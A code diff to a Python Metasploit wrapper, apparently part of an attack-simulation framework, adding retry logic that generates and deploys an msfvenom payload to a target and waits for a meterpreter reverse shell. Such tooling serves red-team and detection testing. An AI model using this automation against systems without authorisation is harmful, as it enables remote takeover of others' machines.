@@ -204,24 +204,31 @@ class Metasploit():
 
         payload_name = kwargs.get("outfile", "babymetal.exe")
         payload_type = kwargs.get("payload", None)
+        retries = 3
         if payload_type is None:
             raise MetasploitError("Payload not defined")
         try:
-            self.start_exploit_stub_for_external_payload(payload_type, lhost=kwargs.get("lhost", None))
+            ip = socket.gethostbyname(self.attacker.get_ip())
+            self.start_exploit_stub_for_external_payload(payload_type, lhost=kwargs.get("lhost", ip))
             self.wait_for_session(2)
         except MetasploitError:
+            while retries:
+                self.attack_logger.vprint(
+                    f"{CommandlineColors.OKCYAN}Create payload {payload_name} {CommandlineColors.ENDC}",
+                    1)
+                venom = MSFVenom(self.attacker, target, self.attack_logger)
+                venom.generate_and_deploy(**kwargs)
+                self.attack_logger.vprint(
+                    f"{CommandlineColors.OKCYAN}Execute {payload_name} - waiting for meterpreter shell{CommandlineColors.ENDC}",
+                    1)
 
-            self.attack_logger.vprint(
-                f"{CommandlineColors.OKCYAN}Create payload {payload_name} {CommandlineColors.ENDC}",
-                1)
-            venom = MSFVenom(self.attacker, target, self.attack_logger)
-            venom.generate_and_deploy(**kwargs)
-            self.attack_logger.vprint(
-                f"{CommandlineColors.OKCYAN}Execute {payload_name} - waiting for meterpreter shell{CommandlineColors.ENDC}",
-                1)
-
-            self.start_exploit_stub_for_external_payload(payload=payload_type, lhost=kwargs.get("lhost", None))
-            self.wait_for_session()
+                self.start_exploit_stub_for_external_payload(payload=payload_type, lhost=kwargs.get("lhost", None))
+                try:
+                    self.wait_for_session(100)
+                    break
+                except MetasploitError:
+                    retries -= 1
+                    print(f"Global metasploit retries: {retries}")
 
 ##########################################################################
 
